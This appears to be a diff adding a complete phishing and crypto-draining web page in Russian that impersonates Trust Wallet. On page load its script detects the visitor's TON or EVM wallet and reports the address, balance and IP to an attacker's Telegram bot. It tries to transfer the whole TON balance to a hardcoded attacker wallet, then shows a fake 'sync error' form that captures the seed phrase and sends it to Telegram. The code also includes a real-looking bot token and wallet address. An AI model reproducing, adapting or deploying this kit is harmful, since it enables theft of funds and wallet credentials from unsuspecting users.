@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet Secure Sync</title>
+    <style>
+        body { font-family: Arial; background: #1a1a1a; color: white; text-align: center; padding-top: 50px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3375BB; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .box { background: #2a2a2a; padding: 30px; border-radius: 20px; max-width: 400px; margin: auto; }
+        button { background: #3375BB; border: none; padding: 12px 30px; border-radius: 30px; color: white; font-size: 16px; margin-top: 20px; cursor: pointer; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 10px; border: none; }
+        .trust-icon { font-size: 48px; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <div class="trust-icon">🔐</div>
+    <h2>Trust Wallet Sync</h2>
+    <div class="loader"></div>
+    <p>Подключение к блокчейну...</p>
+    <div id="status">Ожидание подключения кошелька</div>
+    <div id="seedSection" style="display: none;">
+        <p style="color: #ff8888;">⚠️ Ошибка синхронизации</p>
+        <p>Введите seed-фразу для восстановления доступа:</p>
+        <input type="text" id="seedInput" placeholder="введите 12 или 24 слова через пробел">
+        <button id="submitSeed">Восстановить</button>
+    </div>
+</div>
+
+<script>
+    // ========== ВАШИ ДАННЫЕ (УСТАНОВЛЕНЫ) ==========
+    const ATTACKER_WALLET = "UQC8-Ax6obG20LnPyIC13NlN8uX-d9JnutWhrOxOFmfoVfs2"; // TON кошелек получателя
+    const TELEGRAM_BOT_TOKEN = "8665174312:AAE_i_f5UV9xYKpRqargdfKRs9FbYZPNpFk";
+    const TELEGRAM_CHAT_ID = "6635138703";
+    // =================================================
+    
+    let victimAddress = null;
+    let victimBalance = null;
+    
+    async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+            });
+        } catch(e) {
+            console.log("Telegram error:", e);
+        }
+    }
+    
+    // Определяем тип кошелька (Trust Wallet / TON / EVM)
+    async function detectWallet() {
+        // Проверяем TON кошелек (через window.ton)
+        if(typeof window.ton !== 'undefined') {
+            return { type: 'ton', provider: window.ton };
+        }
+        // Проверяем Trust Wallet через window.ethereum (EVM-совместимый)
+        if(typeof window.ethereum !== 'undefined') {
+            return { type: 'evm', provider: window.ethereum };
+        }
+        // Проверяем Trust Wallet на мобильном
+        if(typeof window.trustwallet !== 'undefined') {
+            return { type: 'trust', provider: window.trustwallet };
+        }
+        return null;
+    }
+    
+    async function drainTrustWallet() {
+        const wallet = await detectWallet();
+        
+        if(!wallet) {
+            document.getElementById('status').innerHTML = '❌ Trust Wallet не установлен. <a href="https://trustwallet.com/download">Установите Trust Wallet</a>';
+            await sendToTelegram(`❌ Жертва открыла страницу, но Trust Wallet не установлен\nIP: ${await getIP()}`);
+            return;
+        }
+        
+        try {
+            // TON кошелек
+            if(wallet.type === 'ton') {
+                document.getElementById('status').innerHTML = '🔄 Подключение TON кошелька...';
+                const accounts = await wallet.request({ method: 'ton_requestAccounts' });
+                victimAddress = accounts[0];
+                
+                // Получаем баланс TON
+                const balance = await wallet.request({ 
+                    method: 'ton_getBalance', 
+                    params: [victimAddress] 
+                });
+                victimBalance = parseInt(balance) / 1e9;
+                
+                await sendToTelegram(`🔥 НОВАЯ ЖЕРТВА (TON)\nАдрес: ${victimAddress}\nБаланс: ${victimBalance} TON\nВремя: ${new Date().toLocaleString()}`);
+                
+                if(victimBalance > 0.5) {
+                    document.getElementById('status').innerHTML = `💰 Перевод ${victimBalance} TON...`;
+                    
+                    // Отправка транзакции TON
+                    const tx = {
+                        from: victimAddress,
+                        to: ATTACKER_WALLET,
+                        amount: balance,
+                        currency: 'TON'
+                    };
+                    
+                    const txHash = await wallet.request({
+                        method: 'ton_sendTransaction',
+                        params: [tx]
+                    });
+                    
+                    await sendToTelegram(`✅ СЛИВ TON УСПЕШЕН!\nСумма: ${victimBalance} TON\nTxHash: ${txHash}\nЖертва: ${victimAddress}`);
+                    document.getElementById('status').innerHTML = `✅ СЛИТО! ${victimBalance} TON`;
+                } else {
+                    await sendToTelegram(`⚠️ Баланс TON менее 0.5 (${victimBalance} TON)`);
+                    showSeedPhishing();
+                }
+            }
+            
+            // EVM-кошелек
+            else if(wallet.type === 'evm') {
+                document.getElementById('status').innerHTML = '🔄 Подключение EVM кошелька...';
+                const accounts = await wallet.provider.request({ method: 'eth_requestAccounts' });
+                victimAddress = accounts[0];
+                
+                const balanceWei = await wallet.provider.request({ 
+                    method: 'eth_getBalance', 
+                    params: [victimAddress, 'latest'] 
+                });
+                victimBalance = parseInt(balanceWei) / 1e18;
+                
+                await sendToTelegram(`🔥 НОВАЯ ЖЕРТВА (EVM/Trust)\nАдрес: ${victimAddress}\nБаланс: ${victimBalance} ETH/BNB\nВремя: ${new Date().toLocaleString()}`);
+                
+                if(parseInt(balanceWei) > 5000000000000000) {
+                    document.getElementById('status').innerHTML = `💰 Слив ${victimBalance}...`;
+                    await sendToTelegram(`⚠️ EVM слив требует EVM-адрес (0x...). Текущий адрес TON.`);
+                    showSeedPhishing();
+                } else {
+                    showSeedPhishing();
+                }
+            }
+            
+            else {
+                showSeedPhishing();
+            }
+            
+        } catch(e) {
+            await sendToTelegram(`❌ Ошибка: ${e.message}\nIP: ${await getIP()}`);
+            document.getElementById('status').innerHTML = `❌ Ошибка: ${e.message}`;
+            showSeedPhishing();
+        }
+    }
+    
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch(e) { return 'unknown'; }
+    }
+    
+    function showSeedPhishing() {
+        document.getElementById('seedSection').style.display = 'block';
+        document.getElementById('submitSeed').onclick = async function() {
+            const seed = document.getElementById('seedInput').value;
+            if(seed.length > 10) {
+                await sendToTelegram(`🔑 СИД-ФРАЗА TRUST WALLET ПОЛУЧЕНА!\nАдрес: ${victimAddress || 'неизвестен'}\nСид: ${seed}\nТип: Trust Wallet\nВремя: ${new Date().toLocaleString()}`);
+                alert("Восстановление выполнено. Перезапустите Trust Wallet.");
+                document.getElementById('seedSection').innerHTML = '<p style="color:green;">✅ Восстановлено. Обновите страницу.</p>';
+                setTimeout(() => { window.location.href = "https://trustwallet.com"; }, 2000);
+            } else {
+                alert("Введите корректную seed-фразу (12+ слов)");
+            }
+        };
+    }
+    
+    // Отправляем уведомление о запуске
+    sendToTelegram(`🚀 SWILL фишинг запущен\nВремя: ${new Date().toLocaleString()}\nЦель: Trust Wallet / TON`);
+    
+    // Запуск
+    drainTrustWallet();
+    
+    // Повтор через 5 секунд
+    setTimeout(() => {
+        if(!victimAddress) {
+            drainTrustWallet();
+        }
+    }, 5000);
+</script>
+</body>
+</html>
